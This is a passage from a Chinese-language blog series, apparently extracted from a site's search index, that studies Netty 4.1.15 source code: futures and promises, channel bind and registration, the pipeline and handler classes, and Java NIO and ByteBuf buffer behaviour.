searcher.search(target); }});executor.execute(future); 可以通过 Executor 的实例去执行，最后再从 future 中获取 Netty.Futurepublic interface Future&lt;V&gt; extends java.util.concurrent.Future&lt;V&gt; { boolean isSuccess(); boolean isCancellable(); Throwable cause(); /** * Adds the specified listener to this future. The * specified listener is notified when this future is * {@linkplain #isDone() done}. If this future is already * completed, the specified listener is notified immediately. */ Future&lt;V&gt; addListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); /** * Adds the specified listeners to this future. The * specified listeners are notified when this future is * {@linkplain #isDone() done}. If this future is already * completed, the specified listeners are notified immediately. */ Future&lt;V&gt; addListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); /** * Removes the first occurrence of the specified listener from this future. * The specified listener is no longer notified when this * future is {@linkplain #isDone() done}. If the specified * listener is not associated with this future, this method * does nothing and returns silently. */ Future&lt;V&gt; removeListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); /** * Removes the first occurrence for each of the listeners from this future. * The specified listeners are no longer notified when this * future is {@linkplain #isDone() done}. If the specified * listeners are not associated with this future, this method * does nothing and returns silently. */ Future&lt;V&gt; removeListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); // 等待Future完成 Future&lt;V&gt; sync() throws InterruptedException; Future&lt;V&gt; syncUninterruptibly(); Future&lt;V&gt; await() throws InterruptedException; Future&lt;V&gt; awaitUninterruptibly(); boolean await(long timeout, TimeUnit unit) throws InterruptedException; boolean await(long timeoutMillis) throws InterruptedException; boolean awaitUninterruptibly(long timeout, TimeUnit unit); boolean awaitUninterruptibly(long timeoutMillis); V getNow(); @Override boolean cancel(boolean mayInterruptIfRunning);} 我们主要看看 xxListener 方法，一后缀为 Listener 使用了观察者模式 它比 JUC.Future 更厉害的是就因为这个 Listener ，虽然 JUC.Future 可以调用 get() 方法，获取异步结果，但是我们不知道什么时候去调用，调用早了就堵塞在那里；而 Netty.Future 使用了观察者模式，当完成时会自动触发 ChannelFuture我们回到 ChannelFuture ，都重写了 Netty.Future 中的方法，返回值是 Future 的子类，java5或者以前，必须一样，java7以后可以不同，但是必须是父类返回值的派生类 public interface ChannelFuture extends Future&lt;Void&gt; { /** * Returns a channel where the I/O operation associated with this * future takes place. */ Channel channel(); @Override ChannelFuture addListener(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt; listener); @Override ChannelFuture addListeners(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt;... listeners); @Override ChannelFuture removeListener(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt; listener); @Override ChannelFuture removeListeners(GenericFutureListener&lt;? extends Future&lt;? super Void&gt;&gt;... listeners); @Override ChannelFuture sync() throws InterruptedException; @Override ChannelFuture syncUninterruptibly(); @Override ChannelFuture await() throws InterruptedException; @Override ChannelFuture awaitUninterruptibly(); 文档： io.netty.channelpublic interface ChannelFutureextends Future The result of an asynchronous Channel I/O operation. All I/O operations in Netty are asynchronous. It means any I/O calls will return immediately with no guarantee that the requested I/O operation has been completed at the end of the call. Instead, you will be returned with a ChannelFuture instance which gives you the information about the result or status of the I/O operation. A ChannelFuture is either uncompleted or completed. When an I/O operation begins, a new future object is created. The new future is uncompleted initially - it is neither succeeded, failed, nor cancelled because the I/O operation is not finished yet. If the I/O operation is finished either successfully, with failure, or by cancellation, the future is marked as completed with more specific information, such as the cause of the failure. Please note that even failure and cancellation belong to the completed state. +---------------------------+ | Completed successfully | +---------------------------+ +----&gt; isDone() = true |+--------------------------+ | | isSuccess() = true || Uncompleted | | +===========================++--------------------------+ | | Completed with failure || isDone() = false | | +---------------------------+| isSuccess() = false |----+----&gt; isDone() = true || isCancelled() = false | | | cause() = non-null || cause() = null | | +===========================++--------------------------+ | | Completed by cancellation | | +---------------------------+ +----&gt; isDone() = true | | isCancelled() = true | +---------------------------+ Various methods are provided to let you check if the I/O operation has been completed, wait for the completion, and retrieve the result of the I/O operation. It also allows you to add ChannelFutureListeners so you can get notified when the I/O operation is completed. 推荐使用监听器而不是等待的方法 // BAD - NEVER DO THIS@Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) { ChannelFuture future = ctx.channel().close(); future.awaitUninterruptibly(); // Perform post-closure operation // ...}// GOOD@Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) { ChannelFuture future = ctx.channel().close(); future.addListener(new ChannelFutureListener() { public void operationComplete(ChannelFuture future) { // Perform post-closure operation // ... } });} 不要混淆连接超时和等待超时 // BAD - NEVER DO THISBootstrap b = ...;ChannelFuture f = b.connect(...);f.awaitUninterruptibly(10, TimeUnit.SECONDS);if (f.isCancelled()) { // Connection attempt cancelled by user} else if (!f.isSuccess()) { // You might get a NullPointerException here because the future // might not be completed yet. f.cause().printStackTrace();} else { // Connection established successfully}// GOODBootstrap b = ...;// Configure the connect timeout option.b.option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);ChannelFuture f = b.connect(...);f.awaitUninterruptibly();// Now we are sure the future is completed.assert f.isDone();if (f.isCancelled()) { // Connection attempt cancelled by user} else if (!f.isSuccess()) { f.cause().printStackTrace();} else { // Connection established successfully} bind()方法当我们调用 bind 方法时，才真正的启动服务器 ChannelFuture channelFuture = bootstrap.bind(8899).sync(); 通过一些判断最终到 doBind 方法上 private ChannelFuture doBind(final SocketAddress localAddress) { final ChannelFuture regFuture = initAndRegister(); final Channel channel = regFuture.channel(); if (regFuture.cause() != null) { return regFuture; } if (regFuture.isDone()) { // At this point we know that the registration was complete and successful. ChannelPromise promise = channel.newPromise(); doBind0(regFuture, channel, localAddress, promise); return promise; } else { // Registration future is almost always fulfilled already, but just in case it's not. final PendingRegistrationPromise promise = new PendingRegistrationPromise(channel); regFuture.addListener(new ChannelFutureListener() { @Override public void operationComplete(ChannelFuture future) throws Exception { Throwable cause = future.cause(); if (cause != null) { // Registration on the EventLoop failed so fail the ChannelPromise directly to not cause an // IllegalStateException once we try to access the EventLoop of the Channel. promise.setFailure(cause); } else { // Registration was successful, so set the correct executor to use. // See https://github.com/netty/netty/issues/2586 promise.registered(); doBind0(regFuture, channel, localAddress, promise); } } }); return promise; }} initAndRegister()方法这个主要是初始化和注册，比较复杂，后续在分析 加油！！！","link":"/2019/01/03/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"Netty 源码分析（三）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. addLast 方法io.netty.channel.DefaultChannelPipeline#addLast @Overridepublic final ChannelPipeline addLast(EventExecutorGroup group, String name, ChannelHandler handler) { final AbstractChannelHandlerContext newCtx; synchronized (this) { checkMultiplicity(handler); newCtx = newContext(group, filterName(name, handler), handler); addLast0(newCtx); // 是把 ChannelHandlerContext 添加进去 // If the registered is false it means that the channel was not registered on an eventloop yet. // In this case we add the context to the pipeline and add a task that will call // ChannelHandler.handlerAdded(...) once the channel is registered. if (!registered) { newCtx.setAddPending(); callHandlerCallbackLater(newCtx, true); return this; } EventExecutor executor = newCtx.executor(); if (!executor.inEventLoop()) { newCtx.setAddPending(); executor.execute(new Runnable() { @Override public void run() { callHandlerAdded0(newCtx); } }); return this; } } callHandlerAdded0(newCtx); return this;} AbstractChannelHandlerContext 定义了一个上下文，找到实现的一个接口 ChannelHandlerContext io.netty.channel.ChannelHandlerContext 文档：https://netty.io/5.0/api/io/netty/channel/ChannelHandlerContext.html 接下来我分析一下 ChannelHandlerContext ，PipeLine，Handler 这三者的关系 这篇文章写的很清楚 https://blog.csdn.net/u010853261/article/details/54574440 ChannelHandlerContext每个ChannelHandler被添加到ChannelPipeline后，都会创建一个ChannelHandlerContext并与之创建的ChannelHandler关联绑定。ChannelHandlerContext允许ChannelHandler与其他的ChannelHandler实现进行交互。ChannelHandlerContext不会改变添加到其中的ChannelHandler，因此它是安全的 下图显示了ChannelHandlerContext、ChannelHandler、ChannelPipeline的关系： 最后我们看到 private void addLast0(AbstractChannelHandlerContext newCtx) { AbstractChannelHandlerContext prev = tail.prev; newCtx.prev = prev; newCtx.next = tail; prev.next = newCtx; tail.prev = newCtx;} 我们的双向链表链表维护的是 ChannelHandlerContext 对象，而ChannelHandlerContext 包装了 ChannelHandler 我们回到 addLast 方法上 p.addLast(new ChannelInitializer&lt;Channel&gt;() { @Override public void initChannel(final Channel ch) throws Exception { final ChannelPipeline pipeline = ch.pipeline(); ChannelHandler handler = config.handler(); if (handler != null) { pipeline.addLast(handler); } ch.eventLoop().execute(new Runnable() { @Override public void run() { pipeline.addLast(new ServerBootstrapAcceptor( ch, currentChildGroup, currentChildHandler, currentChildOptions, currentChildAttrs)); } }); }}); 进入 ChannelInitializer 类中，我们看 #initChannel 方法，说这个方法当 Channel 注册时会被调用，一旦掉用完就会被移除 ChannelPipeline，这是因为只需要把里面封装的 Handler 添加到 ChannelPipeline，因为他本身就不一个 Handler io.netty.channel.ChannelInitializerprotected abstract void initChannel(C ch) This method will be called once the Channel was registered. After the method returns this instance will be removed from the ChannelPipeline of the Channel. 下面是移除代码 private boolean initChannel(ChannelHandlerContext ctx) throws Exception { if (initMap.putIfAbsent(ctx, Boolean.TRUE) == null) { // Guard against re-entrance. try { initChannel((C) ctx.channel()); } catch (Throwable cause) { // Explicitly call exceptionCaught(...) as we removed the handler before calling initChannel(...). // We do so to prevent multiple calls to initChannel(...). exceptionCaught(ctx, cause); } finally { remove(ctx); } return true; } return false;}private void remove(ChannelHandlerContext ctx) { try { ChannelPipeline pipeline = ctx.pipeline(); if (pipeline.context(this) != null) { pipeline.remove(this); } } finally { initMap.remove(ctx); }} ChannelHandlerContext.attr(..) == Channel.attr(..)https://netty.io/wiki/new-and-noteworthy-in-4.1.html Both Channel and ChannelHandlerContext implement the interface AttributeMap to enable a user to attach one or more user-defined attributes to them. What sometimes made a user confused was that a Channel and a ChannelHandlerContext had its own storage for the user-defined attributes. For example, even if you put an attribute ‘KEY_X’ via Channel.attr(KEY_X).set(valueX), you will never find it via ChannelHandlerContext.attr(KEY_X).get() and vice versa. This behavior is not only confusing but also is waste of memory. To address this issue, we decided to keep only one map per Channel internally. AttributeMap always uses AttributeKey as its key. AttributeKey ensures uniqueness between each key, and thus there’s no point of having more than one attribute map per Channel. As long as a user defines its own AttributeKey as a private static final field of his or her ChannelHandler, there will be no risk of duplicate keys. 注意：现在这两个关联的是一个Map callHandlerCallbackLater 我们回到 #addLast 方法上，这个时候是还没有注册的，进入这个 #callHandlerCallbackLater 方法，把稍后调用 Handler 回调，封装成一个 task private void callHandlerCallbackLater(AbstractChannelHandlerContext ctx, boolean added) { assert !registered; PendingHandlerCallback task = added ? new PendingHandlerAddedTask(ctx) : new PendingHandlerRemovedTask(ctx); PendingHandlerCallback pending = pendingHandlerCallbackHead; if (pending == null) { pendingHandlerCallbackHead = task; } else { // Find the tail of the linked-list. while (pending.next != null) { pending = pending.next; } pending.next = task; }} 注册我们回到io.netty.bootstrap.AbstractBootstrap#initAndRegister final ChannelFuture initAndRegister() { Channel channel = null; try { channel = channelFactory.newChannel(); init(channel); } catch (Throwable t) { if (channel != null) { // channel can be null if newChannel crashed (eg SocketException(&quot;too many open files&quot;)) channel.unsafe().closeForcibly(); } // as the Channel is not registered yet we need to force the usage of the GlobalEventExecutor return new DefaultChannelPromise(channel, GlobalEventExecutor.INSTANCE).setFailure(t); } ChannelFuture regFuture = config().group().register(channel); if (regFuture.cause() != null) { if (channel.isRegistered()) { channel.close(); } else { channel.unsafe().closeForcibly(); } } 前面的初始化初始化已经有一点的了解，现在我来看注册，这里有#config，#group 和 #register 这三个方法，我们一个一个分析 ChannelFuture regFuture = config().group().register(channel); config 方法/** * Returns the {@link AbstractBootstrapConfig} object that can be used to obtain the current config * of the bootstrap. */public abstract AbstractBootstrapConfig&lt;B, C&gt; config(); 返回了一个 ServerbootstrapConfig 对象 group 方法/** * Returns the configured {@link EventLoopGroup} or {@code null} if non is configured yet. */@SuppressWarnings(&quot;deprecation&quot;)public final EventLoopGroup group() { return bootstrap.group();} 返回一个 NioEventLoopGroup 对象，这个时候返回的是一个调用的是他的父类MultithreadEventLoopGroup的 register 方法io.netty.channel.MultithreadEventLoopGroup#register(io.netty.channel.Channel) 最终会调用 io.netty.channel.SingleThreadEventLoop#register(io.netty.channel.Channel) 的注册方法 我们来看看这个类 io.netty.channel.SingleThreadEventLoop io.netty.channelpublic abstract class SingleThreadEventLoopextends SingleThreadEventExecutorimplements EventLoopAbstract base class for EventLoops that execute all its submitted tasks in a single thread. io.netty.channel.AbstractChannel.AbstractUnsafe#register @Overridepublic final void register(EventLoop eventLoop, final ChannelPromise promise) { if (eventLoop == null) { throw new NullPointerException(&quot;eventLoop&quot;); } if (isRegistered()) { promise.setFailure(new IllegalStateException(&quot;registered to an event loop already&quot;)); return; } if (!isCompatible(eventLoop)) { promise.setFailure( new IllegalStateException(&quot;incompatible event loop type: &quot; + eventLoop.getClass().getName())); return; } AbstractChannel.this.eventLoop = eventLoop; // 如果是当前线程就让它执行 if (eventLoop.inEventLoop()) { register0(promise); // 如果不是的话就放到线程池中注册 } else { try { eventLoop.execute(new Runnable() { @Override public void run() { register0(promise); } }); } catch (Throwable t) { logger.warn( &quot;Force-closing a channel whose registration task was not accepted by an event loop: {}&quot;, AbstractChannel.this, t); closeForcibly(); closeFuture.setClosed(); safeSetFailure(promise, t); } }} 先理解一下线程 Netty 中的线程模型 一个 EventLoopGroup 当中会包含多个 EventLoop 一个 EventLoop 在它的整个生命周期当中都只会与唯一一个 Thread 进行绑定 所有 EventLoop 所处理的各种 I/O 事件都是将在他所关联的那个 Thread 上进行处理 一个 Channel 在它的整个生命周期中只会注册在一个 EventLoop 上 一个 EventLoop 在运行过程中，会被分配给一或者多个 Channel 重要结论： 在Netty 中 Channel 的实现是线程安全的，基于此，我们可以存储一个 Channel 的引用，并且在需要向远程端点发送数据时，通过这个引用来调用 Channel 相应的方法，即便是当时有很多线程都在使用它也不会出现多线程的问题，而且消息一点会按照这个顺序发送出去 我们在业务开发中，不要将执行耗时的任务放入到 EventLoop 的执行队列中，因为它会堵塞该线程的所有Channel 上的其它执行任务，如果我们需要进行阻塞调用或则是耗时操作，那么我们需要使用一个专门的EventExectutor(业务线程池) 通常会有两种实现方式： 在 ChannelHandler 的回调方法中，使用自己定义的业务线程池，这样就可以实现异步调用 借助于 Netty 提供的向 ChannelPipeline 添加ChannelHandler是调用的addLast方法来传递 EventExecutorGroup 说明：如果addLast(handler)的方法是由I/O线程所执行的，如果addLast(eventExectutorGroup, handler)的方法，那么就是由参数中的group的线程组来执行 io.netty.channel.AbstractChannel.AbstractUnsafe#register0 private void register0(ChannelPromise promise) { try { // check if the channel is still open as it could be closed in the mean time when the register // call was outside of the eventLoop if (!promise.setUncancellable() || !ensureOpen(promise)) { return; } boolean firstRegistration = neverRegistered; doRegister(); // 这个方法 neverRegistered = false; registered = true; // Ensure we call handlerAdded(...) before we actually notify the promise. This is needed as the // user may already fire events through the pipeline in the ChannelFutureListener. pipeline.invokeHandlerAddedIfNeeded(); safeSetSuccess(promise); pipeline.fireChannelRegistered(); // Only fire a channelActive if the channel has never been registered. This prevents firing // multiple channel actives if the channel is deregistered and re-registered. if (isActive()) { if (firstRegistration) { pipeline.fireChannelActive(); } else if (config().isAutoRead()) { // This channel was registered before and autoRead() is set. This means we need to begin read // again so that we process inbound data. // // See https://github.com/netty/netty/issues/4805 beginRead(); } } } catch (Throwable t) { // Close the channel directly to avoid FD leak. closeForcibly(); closeFuture.setClosed(); safeSetFailure(promise, t); }} io.netty.channel.nio.AbstractNioChannel#doRegister 看到 doXxx 开头的方法就知道是认真工作的 @Overrideprotected void doRegister() throws Exception { boolean selected = false; for (;;) { try { selectionKey = javaChannel().register(eventLoop().unwrappedSelector(), 0, this); return; } catch (CancelledKeyException e) { if (!selected) { // Force the Selector to select now as the &quot;canceled&quot; SelectionKey may still be // cached and not removed because no Select.select(..) operation was called yet. eventLoop().selectNow(); selected = true; } else { // We forced a select operation on the selector before but the SelectionKey is still cached // for whatever reason. JDK bug ? throw e; } } }} 与我们前面写的 NIO 逻辑是一样的 serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); syncpublic class MyServer { public static void main(String[] args) throws InterruptedException { EventLoopGroup bossGroup = new NioEventLoopGroup(); EventLoopGroup workGroup = new NioEventLoopGroup(); try { ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .option(ChannelOption.SO_KEEPALIVE, false) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new MyServerinitializer()); ChannelFuture channelFuture = bootstrap.bind(8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { bossGroup.shutdownGracefully(); bossGroup.shutdownGracefully(); } }} 我们回到我们编写的 Server 中，需要绑定，之后需要调用 #sync 表示这个方法需要同步，要不然还没绑定完成就返回了 ChannelFuture ，里面的结果或者状态是还没有完成的，加了 #sync 就能保证完成 ChannelFuture channelFuture = bootstrap.bind(8899).sync(); 在我们正常开发是流程就会停在下面，就卡住了 channelFuture.channel().closeFuture().sync(); 当我们调用关闭就会到 finally 中，会执行优雅关闭 到此我们启动过程基本分析完了","link":"/2019/01/16/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"},{"title":"Netty 源码分析（四）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. ChannelPromiseio.netty.channel.ChannelPromise 前面我们分析了 ChannelFuture ，看看ChannelPromise 的作用 /** * Special {@link ChannelFuture} which is writable. */public interface ChannelPromise extends ChannelFuture, Promise&lt;Void&gt; { ... } 这是一个可以写入的 ChannelFuture ，我先看看 Promise 这个类 Promiseio.netty.util.concurrent.Promise public interface Promise&lt;V&gt; extends Future&lt;V&gt; { /** * Marks this future as a success and notifies all * listeners. * * If it is success or failed already it will throw an {@link IllegalStateException}. */ Promise&lt;V&gt; setSuccess(V result); /** * Marks this future as a success and notifies all * listeners. * * @return {@code true} if and only if successfully marked this future as * a success. Otherwise {@code false} because this future is * already marked as either a success or a failure. */ boolean trySuccess(V result); /** * Marks this future as a failure and notifies all * listeners. * * If it is success or failed already it will throw an {@link IllegalStateException}. */ Promise&lt;V&gt; setFailure(Throwable cause); /** * Marks this future as a failure and notifies all * listeners. * * @return {@code true} if and only if successfully marked this future as * a failure. Otherwise {@code false} because this future is * already marked as either a success or a failure. */ boolean tryFailure(Throwable cause); /** * Make this future impossible to cancel. * * @return {@code true} if and only if successfully marked this future as uncancellable or it is already done * without being cancelled. {@code false} if this future has been cancelled already. */ boolean setUncancellable(); @Override Promise&lt;V&gt; addListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); @Override Promise&lt;V&gt; addListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); @Override Promise&lt;V&gt; removeListener(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt; listener); @Override Promise&lt;V&gt; removeListeners(GenericFutureListener&lt;? extends Future&lt;? super V&gt;&gt;... listeners); @Override Promise&lt;V&gt; await() throws InterruptedException; @Override Promise&lt;V&gt; awaitUninterruptibly(); @Override Promise&lt;V&gt; sync() throws InterruptedException; @Override Promise&lt;V&gt; syncUninterruptibly();} JDK 所提供的的 Future 只能通过手工的方式检查执行结果，而这个操作是会阻塞的；Netty 则对 ChannelFutre 进行了增强，通过 ChannelFutureListener 以回调的方式来获取执行结果，去除了手工检查阻塞的操作，值得注意的是，ChannelFutrureListener 的 operationComplete 方法是由I/O线程执行的，因此要注意的是不要在这里执行耗时操作，否则需要通过另外的线程或线程池来执行 ChannelInboundHandlerAdapterio.netty.channel.ChannelInboundHandlerAdapter io.netty.channelpublic class ChannelInboundHandlerAdapterextends ChannelHandlerAdapter implements ChannelInboundHandlerAbstract base class for ChannelInboundHandler implementations which provide implementations of all of their methods. This implementation just forward the operation to the next ChannelHandler in the ChannelPipeline. Sub-classes may override a method implementation to change this. Be aware that messages are not released after the channelRead(ChannelHandlerContext, Object) method returns automatically. If you are looking for a ChannelInboundHandler implementation that releases the received messages automatically, please see SimpleChannelInboundHandler. 这里使用了适配器模式 ChannelInboundHandlerio.netty.channel.ChannelInboundHandler /** * {@link ChannelHandler} which adds callbacks for state changes. This allows the user * to hook in to state changes easily. */public interface ChannelInboundHandler extends ChannelHandler { /** * The {@link Channel} of the {@link ChannelHandlerContext} was registered with its {@link EventLoop} */ void channelRegistered(ChannelHandlerContext ctx) throws Exception; /** * The {@link Channel} of the {@link ChannelHandlerContext} was unregistered from its {@link EventLoop} */ void channelUnregistered(ChannelHandlerContext ctx) throws Exception; /** * The {@link Channel} of the {@link ChannelHandlerContext} is now active */ void channelActive(ChannelHandlerContext ctx) throws Exception; /** * The {@link Channel} of the {@link ChannelHandlerContext} was registered is now inactive and reached its * end of lifetime. */ void channelInactive(ChannelHandlerContext ctx) throws Exception; /** * Invoked when the current {@link Channel} has read a message from the peer. */ void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception; /** * Invoked when the last message read by the current read operation has been consumed by * {@link #channelRead(ChannelHandlerContext, Object)}. If {@link ChannelOption#AUTO_READ} is off, no further * attempt to read an inbound data from the current {@link Channel} will be made until * {@link ChannelHandlerContext#read()} is called. */ void channelReadComplete(ChannelHandlerContext ctx) throws Exception; /** * Gets called if an user event was triggered. */ void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception; /** * Gets called once the writable state of a {@link Channel} changed. You can check the state with * {@link Channel#isWritable()}. */ void channelWritabilityChanged(ChannelHandlerContext ctx) throws Exception; /** * Gets called if a {@link Throwable} was thrown. */ @Override @SuppressWarnings(&quot;deprecation&quot;) void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception;} SimpleChannelInboundHandlerio.netty.channel.SimpleChannelInboundHandler 我们在写自己的 Handler 的时候长会继承这个 SimpleChannelInboundHandler public class MyServerHandler extends SimpleChannelInboundHandler&lt;String&gt;{ @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception { System.out.println(ctx.channel().remoteAddress() + &quot;: &quot; + msg); ctx.channel().writeAndFlush(&quot;from server: &quot; + UUID.randomUUID()); } /** * 出现异常关闭连接 * @param ctx * @param cause * @throws Exception */ @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); }} 我们看看这个文档 io.netty.channelpublic abstract class SimpleChannelInboundHandlerextends ChannelInboundHandlerAdapterChannelInboundHandlerAdapter which allows to explicit only handle a specific type of messages. For example here is an implementation which only handle String messages. public class StringHandler extends SimpleChannelInboundHandler&lt;String&gt; { @Override protected void channelRead0(ChannelHandlerContext ctx, String message) throws Exception { System.out.println(message); }} Be aware that depending of the constructor parameters it will release all handled messages by passing them to ReferenceCountUtil.release(Object). In this case you may need to use ReferenceCountUtil.retain(Object) if you pass the object to the next handler in the ChannelPipeline.Forward compatibility notice 我们可以通过泛型指定消息类型 @Overridepublic void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { boolean release = true; try { if (acceptInboundMessage(msg)) { @SuppressWarnings(&quot;unchecked&quot;) I imsg = (I) msg; channelRead0(ctx, imsg); } else { release = false; ctx.fireChannelRead(msg); } } finally { if (autoRelease &amp;&amp; release) { // 把这个消息计数减一，当减为0就丢弃 ReferenceCountUtil.release(msg); } }}/** * &lt;strong&gt;Please keep in mind that this method will be renamed to * {@code messageReceived(ChannelHandlerContext, I)} in 5.0.&lt;/strong&gt; * * Is called for each message of type {@link I}. * * @param ctx the {@link ChannelHandlerContext} which this {@link SimpleChannelInboundHandler} * belongs to * @param msg the message to handle * @throws Exception is thrown if an error occurred */protected abstract void channelRead0(ChannelHandlerContext ctx, I msg) throws Exception; 给我们强制转换为特定的类型，再调用 channelRead0 方法，这是一个抽象方法，需要我们自己去实现 ReferenceCountedio.netty.util.ReferenceCounted io.netty.utilpublic interface ReferenceCountedA reference-counted object that requires explicit deallocation.When a new ReferenceCounted is instantiated, it starts with the reference count of 1. retain() increases the reference count, and release() decreases the reference count. If the reference count is decreased to 0, the object will be deallocated explicitly, and accessing the deallocated object will usually result in an access violation.If an object that implements ReferenceCounted is a container of other objects that implement ReferenceCounted, the contained objects will also be released via release() when the container’s reference count becomes 0. ctx.channel().write()和ctx.write()的区别在 Netty 中有两种发消息的方式，可以直接写到 Channel 中，也可以写到与 ChannelHandler 所关联的那个 ChannelHandlerContext 中，对于 ctx.channel().write() 方式来说，消息会从 ChannelPipeline 的末尾开始流动，对于 ctx.write() 来说，消息将从 ChannelPipeline 中的下一个 ChannelHandler 开始流动 这篇博客个解释了 https://blog.csdn.net/FishSeeker/article/details/78447684 结论： ChannelHandlerContext 与 ChannelHandler 之间的关联绑定关系是永远不会发生改变的，因此对其进行缓存时没有任何问题的 对于与 Channel 的同名方法来说， ChannelHandlerContext 的方法将会产生更短的事件流，所以我们因该在可能的情况下利用这个特性来提升性能 Java NIONIO 总结使用 NIO 进行文件读取所涉及的步骤： 从 FileInputStream 对象获取到 Channel 对象 创建 Buffer 将数据从 Channel 中读取到Buffer中 0 &lt;= mark &lt;= position &lt;= limit &lt;= capacity flip() 方法： 将 limit 值设置为当前的 position 将 position 设置 0 clear() 方法： 将 limit 设置为capacity 将 position 设置为0 compact() 方法： 将所有未读的数据复制到 buffer 起始的位置处 将 position 设置为最后一个未读元素的后面 将 limit 设置为 capacity 现在buffer 就准备好了，但是不会覆盖未读的数据 Java NIO中，关于DirectBuffer，HeapBuffer的疑问？ DirectBuffer 属于堆外存，那应该还是属于用户内存，而不是内核内存？ FileChannel 的read(ByteBuffer dst)函数,write(ByteBuffer src)函数中，如果传入的参数是HeapBuffer类型,则会临时申请一块DirectBuffer,进行数据拷贝，而不是直接进行数据传输，这是出于什么原因？ 答案： https://www.zhihu.com/question/57374068/answer/152691891 Java NIO中的direct buffer（主要是DirectByteBuffer）其实是分两部分的： Java | native |DirectByteBuffer | malloc'd[ address ] -+-&gt; [ data ] | 其中 DirectByteBuffer 自身是一个Java对象，在Java堆中；而这个对象中有个long类型字段address，记录着一块调用 malloc() 申请到的native memory。 所以回到题主的问题： \\1. DirectBuffer 属于堆外存，那应该还是属于用户内存，而不是内核内存？ DirectByteBuffer 自身是（Java）堆内的，它背后真正承载数据的buffer是在（Java）堆外——native memory中的。这是 malloc() 分配出来的内存，是用户态的。 \\2. FileChannel 的read(ByteBuffer dst)函数,write(ByteBuffer src)函数中，如果传入的参数是HeapBuffer类型,则会临时申请一块DirectBuffer,进行数据拷贝，而不是直接进行数据传输，这是出于什么原因？ 题主看的是OpenJDK的 sun.nio.ch.IOUtil.write(FileDescriptor fd, ByteBuffer src, long position, NativeDispatcher nd) 的实现对不对： static int write(FileDescriptor fd, ByteBuffer src, long position, NativeDispatcher nd) throws IOException{ if (src instanceof DirectBuffer) return writeFromNativeBuffer(fd, src, position, nd); // Substitute a native buffer int pos = src.position(); int lim = src.limit(); assert (pos &lt;= lim); int rem = (pos &lt;= lim ? lim - pos : 0); ByteBuffer bb = Util.getTemporaryDirectBuffer(rem); try { bb.put(src); bb.flip(); // Do not update src until we see how many bytes were written src.position(pos); int n = writeFromNativeBuffer(fd, bb, position, nd); if (n &gt; 0) { // now update src src.position(pos + n); } return n; } finally { Util.offerFirstTemporaryDirectBuffer(bb); }} 这里其实是在迁就OpenJDK里的HotSpot VM的一点实现细节。 HotSpot VM里的GC除了CMS之外都是要移动对象的，是所谓“compacting GC”。 如果要把一个Java里的 byte[] 对象的引用传给native代码，让native代码直接访问数组的内容的话，就必须要保证native代码在访问的时候这个 byte[] 对象不能被移动，也就是要被“pin”（钉）住。 可惜HotSpot VM出于一些取舍而决定不实现单个对象层面的object pinning，要pin的话就得暂时禁用GC——也就等于把整个Java堆都给pin住。HotSpot VM对JNI的Critical系API就是这样实现的。这用起来就不那么顺手。 所以 Oracle/Sun JDK / OpenJDK 的这个地方就用了点绕弯的做法。它假设把 HeapByteBuffer 背后的 byte[] 里的内容拷贝一次是一个时间开销可以接受的操作，同时假设真正的I/O可能是一个很慢的操作。 于是它就先把 HeapByteBuffer 背后的 byte[] 的内容拷贝到一个 DirectByteBuffer 背后的native memory去，这个拷贝会涉及 sun.misc.Unsafe.copyMemory() 的调用，背后是类似 memcpy() 的实现。这个操作本质上是会在整个拷贝过程中暂时不允许发生GC的，虽然实现方式跟JNI的Critical系API不太一样。（具体来说是 Unsafe.copyMemory() 是HotSpot VM的一个intrinsic方法，中间没有safepoint所以GC无法发生）。 然后数据被拷贝到native memory之后就好办了，就去做真正的I/O，把 DirectByteBuffer 背后的native memory地址传给真正做I/O的函数。这边就不需要再去访问Java对象去读写要做I/O的数据了。 ByteBuf文档：https://netty.io/4.1/api/index.html 我们看第一个例子 public class ByteBufTest01 { public static void main(String[] args) { final ByteBuf buffer = Unpooled.buffer(10); for (int i = 0, index = 120; i &lt; 10; i++) { buffer.writeByte(index + i); } for (int i = 0; i &lt; 10; i++) { System.out.println(buffer.getByte(i)); } }} 输出： 120121122123124125126127-128-127 我们来看看这个方法的文档 /** * Sets the specified byte at the current {@code writerIndex} * and increases the {@code writerIndex} by {@code 1} in this buffer. * The 24 high-order bits of the specified value are ignored. * * @throws IndexOutOfBoundsException * if {@code this.writableBytes} is less than {@code 1} */public abstract ByteBuf writeByte(int value); 虽然传入的一个 int 值，可是它会丢弃高位的 24 bit，我们知道 int 是 4 字节（32 bit），丢弃 3 字节 （24 bit），就保留到 1 字节（8 bit） 我们要看下一个例子 public class ByteBufTest02 { public static void main(String[] args) { ByteBuf byteBuf = 